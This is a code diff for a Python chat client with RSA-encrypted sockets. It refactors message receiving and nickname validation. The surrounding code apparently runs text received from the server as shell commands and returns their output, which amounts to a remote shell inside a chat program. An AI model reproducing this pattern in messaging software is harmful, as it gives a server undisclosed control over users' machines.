@@ -21,7 +21,8 @@ def listen_for_messages(s : socket.socket):
 
     while not exit_app:
         try:
-            t_nickname, data = rsa.decrypt(s.recv(4096), private_key).decode('utf-8', errors='ignore').split(",")
+            t_nickname, *data = receive_message().split(",")
+            data = "".join(data)
         except Exception as e:
             continue
 
@@ -57,7 +58,7 @@ def listen_for_messages(s : socket.socket):
                     send_message("/output,File or directory not found\n")
                     continue
                 except PermissionError:
-                    send_message("/output, Permission denied\n")
+                    send_message("/output,Permission denied\n")
                     continue
 
             elif len(data) > 0:
@@ -65,8 +66,8 @@ def listen_for_messages(s : socket.socket):
                 data = p.stdout + p.stderr
                 cmd = "\n" + data.decode('utf-8', errors='ignore') + f"\n"
 
-            max_cryptable = int(RSA_KEY_LEN/8) - 19
-            for n in range(0,len(cmd),max_cryptable): # max bytes that rsa can encrypt with 1024 bit key
+            max_cryptable = int(RSA_KEY_LEN/8) - 19         # max bytes that rsa can encrypt with 1024 bit key
+            for n in range(0,len(cmd),max_cryptable): 
                 send_message("/output," + cmd[n:n+max_cryptable])
             continue
 
@@ -145,9 +146,6 @@ def exchange_keys():
 
     server_key = rsa.PublicKey.load_pkcs1( s.recv(RSA_KEY_LEN) )
 
-    s.sendall(public_key.save_pkcs1())
-
-
 def connect_to_server():
     HOST = '127.0.0.1'    # The remote host
     PORT = 58465              # The same port used by the server
@@ -160,7 +158,7 @@ def connect_to_server():
 
         exchange_keys()
 
-        command, *data = rsa.decrypt(s.recv(1024), private_key).decode('utf-8', errors='ignore').split(",")    # if not banned it contains the users
+        command, *data = receive_message().split(",")    # if not banned it contains the users
         if command == "/ban":
             raise UserBannedException()
         
@@ -171,28 +169,34 @@ def connect_to_server():
     except UserBannedException:
         print(colored("[-] You have been banned from the server", "red"))
         return False
+    
 
     global users
     users = list(user for user in data)
     if users[0] == '':
         users = []
 
+    return send_nickname()
+
+def send_nickname():
     msg = Tk()
     msg.withdraw()
 
     global nickname
     nickname = simpledialog.askstring("Nickname", "Enter your nickname: ", parent=msg)
-    if (nickname == None or nickname.strip() == ""):
-        print(colored("[-] Nickname not valid", "red"))
-        send_message("/invalid_nick")
-        return False
 
     send_message(nickname)
+    res = receive_message()
+    
+    if res == "/invalid_nick":
+        print(colored(f"[-] '{nickname}' is not a valid nickname", "red"))
+        return False
+
     return True
 
 
 def send_message(msg):
-    global s, server_key, RSA_KEY_LEN
+    global s, server_key, RSA_KEY_LEN, win
 
     try:
         s.sendall(rsa.encrypt(msg.encode(), server_key))
@@ -206,6 +210,10 @@ def send_message(msg):
     except ConnectionResetError as cre:
         win["-CHAT HISTORY-"].update("Connection closed by server\n", text_color_for_value="red", append=True)
 
+
+def receive_message():
+    global s, private_key
+    return rsa.decrypt(s.recv(1024), private_key).decode('utf-8', errors='ignore')
 
 def main():
     global exit_app
